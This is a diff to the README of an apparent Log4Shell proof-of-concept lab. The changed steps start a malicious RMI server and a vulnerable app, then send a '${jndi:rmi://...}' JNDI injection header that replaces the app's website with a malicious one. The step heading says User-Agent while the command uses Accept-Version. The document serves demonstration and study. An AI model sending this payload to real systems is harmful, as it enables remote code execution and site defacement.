@@ -29,9 +29,7 @@ git clone https://github.com/Labout/log4shell-rmi-poc.git
 ```bash
 cd Log4jshell_rmi_server
 
-./mvnw clean package
-
-java -jar target/Log4jshell.rmi.server-0.0.1-SNAPSHOT.jar
+./startRmiServer.sh 
 ```
 
 You should get something like this:
@@ -46,19 +44,39 @@ In a new Terminal
 ```bash
 cd vulnerabel_log4j_app
 
-./mvnw clean package
-
-java -jar target/vulnerabel_log4j_app-0.0.1-SNAPSHOT.jar
+./startVulnerableService.sh
 ```
 
 
-### 4. Inject a vulnerable JNDI over the "Accept-version" header
+### 4. Get the original site which is in vulnerabel_log4j_app/web
 
 ```bash
+
+curl 'http://localhost:8080/web'
+```
+The original website is returned.
+
+
+### 5. Inject a vulnerable JNDI over the "User-Agent" header 
+
+```bash
+
 curl 'http://localhost:8080/hello' --header 'Accept-Version: ${jndi:rmi://127.0.0.1:1099/ExecByEL}'
 ```
 
-The file /tmp/JNDIPoc gets updated (touch "/tmp/JNDIPoc" is executed).
+The website at  vulnerabel_log4j_app/web gets updated with the site from Log4jshell_rmi_server/web.
+
+
+### 6. Get the malicious site from vulnerabel_log4j_app/web
+
+```bash
+
+curl 'http://localhost:8080/web'
+```
+
+The malicious website is returned.
+
+
 
 ## References 
 https://www.cisecurity.org/log4j-zero-day-vulnerability-response/
